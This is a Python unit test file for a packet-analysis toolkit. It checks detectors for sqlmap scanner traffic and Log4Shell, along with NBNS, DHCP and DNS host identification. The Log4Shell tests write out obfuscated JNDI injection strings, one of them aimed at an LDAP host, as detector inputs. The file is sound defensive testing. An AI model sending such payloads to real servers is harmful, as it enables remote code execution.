def _pkt(n, fields, src="10.0.0.5", dst="10.0.0.9", ts=None):
    from trafkit.models import PacketRecord
    return PacketRecord(frame_number=n, ts=ts if ts is not None else 1000.0 + n, length=100,
                        fields=dict(fields), src_ip=src, dst_ip=dst, proto="tcp",
                        src_port=40000, dst_port=80)


class TestRefactorBehaviour(unittest.TestCase):
    def test_scanner_user_agent_is_one_finding_per_source(self):
        from trafkit.config import Config
        from trafkit.detectors.http import ScannerUserAgentDetector
        pkts = [_pkt(i, {"http.request": True, "http.user_agent": "sqlmap/1.7",
                         "http.request.uri": f"/item?id={i}"}) for i in range(500)]
        findings = ScannerUserAgentDetector(Config()).run(pkts, None)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].evidence["requests"], 500)
        self.assertEqual(len(findings[0].frames), 25)

    def test_obfuscated_log4shell_is_caught(self):
        from trafkit.config import Config
        from trafkit.detectors.http import Log4jJndiDetector, deobfuscate_jndi
        self.assertEqual(deobfuscate_jndi("${${lower:j}ndi:ldap://x/a}"), "${jndi:ldap://x/a}")
        self.assertEqual(deobfuscate_jndi("${${::-j}${::-n}${::-d}${::-i}:rmi://x/a}"),
                         "${jndi:rmi://x/a}")
        pkts = [_pkt(1, {"http.request": True,
                         "http.user_agent": "${${env:NaN:-j}ndi${env:NaN:-:}ldap://203.0.113.9/x}"})]
        findings = Log4jJndiDetector(Config()).run(pkts, None)
        self.assertEqual(len(findings), 1)
        self.assertIn("deobfuscated", findings[0].evidence)

    def test_nbns_query_is_not_the_queriers_name(self):
        query = _pkt(1, {"nbns.name": "WPAD", "nbns.opcode": 0, "nbns.flags.response": 0},
                     src="192.168.1.30", dst="192.168.1.255")
        reg = _pkt(2, {"nbns.name": "LAPTOP-7", "nbns.opcode": 5, "nbns.flags.response": 0,
                       "nbns.addr": "192.168.1.31"}, src="192.168.1.31", dst="192.168.1.255")
        hosts = build_hosts([query, reg])
        self.assertNotIn("WPAD", hosts["192.168.1.30"].hostnames)
        self.assertIn("LAPTOP-7", hosts["192.168.1.31"].hostnames)
        ids = identify_hosts_and_users([query, reg])
        self.assertEqual(ids["nbns_hostnames"], {"192.168.1.31": ["LAPTOP-7"]})

    def test_identify_files_dhcp_hostname_under_assigned_ip(self):
        ids = identify_hosts_and_users(read_pcap(_p("dhcp_nbns_kerberos")))
        self.assertIn("WIN-016", ids["dhcp_hostnames"].get("192.168.1.16", []))
        self.assertNotIn("0.0.0.0", ids["dhcp_hostnames"])

    def test_resolved_addresses_follow_cname_chains(self):
        p = _pkt(1, {"dns.qry.name": "www.example.org", "dns.qry.type": 1, "dns.flags.response": 1,
                     "dns.answer": "edge.example.net", "dns.a": "192.0.2.10",
                     "dns.a_all": ["192.0.2.10", "192.0.2.11"]})
        resolved = resolved_addresses([p])
        self.assertEqual(resolved, {"192.0.2.10": {"www.example.org"},
                                    "192.0.2.11": {"www.example.org"}})

    def test_scapy_backend_is_opt_in_not_required(self):
        from trafkit.pcapread import read_pcap as rp
        self.assertEqual(len(rp(_p("tls_handshake"))), 2)            # native default
        with self.assertRaises(ValueError):
            rp(_p("tls_handshake"), backend="bogus")


